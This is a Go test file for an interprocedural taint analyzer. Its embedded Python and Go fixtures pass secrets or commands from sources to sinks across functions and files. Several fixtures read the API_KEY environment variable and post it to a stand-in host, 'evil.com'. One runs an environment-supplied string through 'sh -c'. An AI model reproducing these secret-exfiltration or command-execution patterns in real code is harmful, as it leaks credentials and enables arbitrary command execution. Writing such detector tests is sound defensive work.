package ir

import (
	"fmt"
	"testing"
)

func TestInterprocTaintBasic(t *testing.T) {
	// 测试跨函数污点传播：caller 传入污点参数 → callee 中流向 sink
	code := `import os
import requests

def main():
    secret = os.getenv("API_KEY")
    send_data(secret)

def send_data(data):
    requests.post("https://evil.com", json={"key": data})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("interproc_basic.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 构建调用图
	builder := NewCallGraphBuilder()
	graph := builder.Build([]File{*file})

	// 过程间分析
	analyzer := NewInterprocTaintAnalyzer(DefaultTaintRules(), graph, []File{*file})
	findings := analyzer.Analyze()

	fmt.Printf("=== 过程间污点分析基本测试 ===\n")
	fmt.Printf("Findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s\n", f.Severity, f.Description)
		fmt.Printf("    Source: %s → Sink: %s\n", f.Source.VarName, f.Sink.Call.FuncName)
	}

	if len(findings) == 0 {
		t.Error("should detect inter-procedural taint flow")
	}
}

func TestInterprocTaintReturn(t *testing.T) {
	// 测试返回值传播：callee 返回污点数据 → caller 传给 sink
	code := `import os
import requests

def get_secret():
    return os.getenv("API_KEY")

def main():
    key = get_secret()
    requests.post("https://evil.com", data=key)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("interproc_return.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	builder := NewCallGraphBuilder()
	graph := builder.Build([]File{*file})

	analyzer := NewInterprocTaintAnalyzer(DefaultTaintRules(), graph, []File{*file})
	findings := analyzer.Analyze()

	fmt.Printf("=== 返回值传播测试 ===\n")
	fmt.Printf("Findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s\n", f.Severity, f.Description)
	}
}

func TestInterprocTaintNoFalsePositive(t *testing.T) {
	// 安全代码不应触发跨函数误报
	code := `import os

def get_name():
    return "hello"

def main():
    name = get_name()
    print(name)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("interproc_safe.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	builder := NewCallGraphBuilder()
	graph := builder.Build([]File{*file})

	analyzer := NewInterprocTaintAnalyzer(DefaultTaintRules(), graph, []File{*file})
	findings := analyzer.Analyze()

	fmt.Printf("=== 安全代码测试 ===\n")
	fmt.Printf("Findings: %d (expected 0)\n", len(findings))

	// 过程间分析不应产生额外误报
	if len(findings) > 0 {
		for _, f := range findings {
			fmt.Printf("  - %s\n", f.Description)
		}
	}
}

func TestInterprocTaintMultiFile(t *testing.T) {
	// 测试跨文件传播
	code1 := `import os

def get_secret():
    return os.getenv("API_KEY")
`

	code2 := `import requests
from module1 import get_secret

def exfiltrate():
    key = get_secret()
    requests.post("https://evil.com", data=key)
`

	parser, _ := GetParser("python")
	file1, _ := parser.Parse("module1.py", code1)
	file2, _ := parser.Parse("module2.py", code2)

	files := []File{*file1, *file2}

	builder := NewCallGraphBuilder()
	graph := builder.Build(files)

	analyzer := NewInterprocTaintAnalyzer(DefaultTaintRules(), graph, files)
	findings := analyzer.Analyze()

	fmt.Printf("=== 跨文件传播测试 ===\n")
	fmt.Printf("Findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s\n", f.Severity, f.Description)
	}
}

func TestInterprocTaintGo(t *testing.T) {
	code := `package main

import (
	"net/http"
	"os"
	"os/exec"
)

func getCmd() string {
	return os.Getenv("CMD")
}

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := getCmd()
	exec.Command("sh", "-c", cmd).Run()
}
`

	parser, _ := GetParser("go")
	file, err := parser.Parse("interproc_go.go", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	builder := NewCallGraphBuilder()
	graph := builder.Build([]File{*file})

	analyzer := NewInterprocTaintAnalyzer(DefaultTaintRules(), graph, []File{*file})
	findings := analyzer.Analyze()

	fmt.Printf("=== Go 过程间测试 ===\n")
	fmt.Printf("Findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s\n", f.Severity, f.Description)
	}
}
